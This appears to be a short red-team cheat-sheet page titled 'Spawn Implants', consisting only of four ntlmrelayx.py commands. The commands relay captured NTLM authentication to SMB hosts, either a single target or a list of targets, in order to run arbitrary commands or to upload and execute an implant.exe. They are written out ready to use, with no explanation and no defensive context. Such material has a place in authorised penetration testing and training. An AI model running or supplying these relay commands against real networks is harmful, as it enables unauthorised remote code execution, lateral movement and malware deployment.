# 03 - Spawn Implants

```
$ sudo ntlmrelayx.py -t smb://<target_IP> -smb2support -c <commands>

$ sudo ntlmrelayx.py -tf targets.txt -smb2support -c <commands>

$ sudo ntlmrelayx.py -t smb://<target_IP> -smb2support -e implant.exe

$ sudo ntlmrelayx.py -tf targets.txt -smb2support -e implant.exe
```